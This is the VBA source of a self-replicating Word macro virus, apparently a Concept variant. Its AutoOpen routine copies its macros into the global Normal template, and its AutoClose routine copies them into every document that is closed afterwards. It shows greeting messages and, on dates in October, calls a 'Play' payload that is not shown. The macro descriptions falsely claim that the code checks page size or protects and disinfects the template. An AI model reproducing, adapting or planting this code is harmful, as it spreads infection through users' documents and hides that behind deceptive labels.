   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Checks Page Size; if not default Page Size, converts document to default Page Size.  FWTMPv7.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim vZap$
   Dim vMacro$
       On Error GoTo -1: On Error GoTo Abort

               vZap$ = WordBasic.[FileName$]()

               vMacro$ = vZap$ + ":Play"
               WordBasic.MacroCopy vMacro$, "Global:Play"

               vMacro$ = vZap$ + ":AutoExit"
               WordBasic.MacroCopy vMacro$, "Global:AutoExit"

               vMacro$ = vZap$ + ":AutoOpen"
               WordBasic.MacroCopy vMacro$, "Global:VOpen"

               vMacro$ = vZap$ + ":VClose"
               WordBasic.MacroCopy vMacro$, "Global:AutoClose"

   Abort:
   End Sub

   Attribute VB_Name = "AutoExit"

   Rem Concept3.AutoExit.Macro
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
   Dim message1$
   Dim message2$
   Dim daynumber
   Dim monthnumber
   message1$ = "´¹Ø¾Å ¼ÕÕè»Øè¹ ,Good Bye !!"
   message2$ = "Happy nice day ´Ð¹Ø¾Å ¾ÕÕ»Øè¹ !!"

   daynumber = WordBasic.Day(WordBasic.Now())
   monthnumber = WordBasic.Month(WordBasic.Now())

   If daynumber > 9 And monthnumber = 10 Then
       WordBasic.MsgBox message2$
       WordBasic.Call "Play"
   Else
       WordBasic.MsgBox message1$
   End If

   End Sub

   Attribute VB_Name = "VClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VClose.MAIN"
   Dim vZap$
   Dim vMacro$
       On Error GoTo -1: On Error GoTo Abort

           WordBasic.FileSaveAs Format:=1

           vZap$ = WordBasic.[FileName$]()

           vMacro$ = vZap$ + ":Play"
           WordBasic.MacroCopy "Global:Play", vMacro$

           vMacro$ = vZap$ + ":AutoExit"
           WordBasic.MacroCopy "Global:AutoExit", vMacro$

           vMacro$ = vZap$ + ":AutoOpen"
           WordBasic.MacroCopy "Global:VOpen", vMacro$

           vMacro$ = vZap$ + ":VClose"
           WordBasic.MacroCopy "Global:AutoClose", vMacro$

           WordBasic.FileSaveAs Format:=1

   Abort:
   End Sub
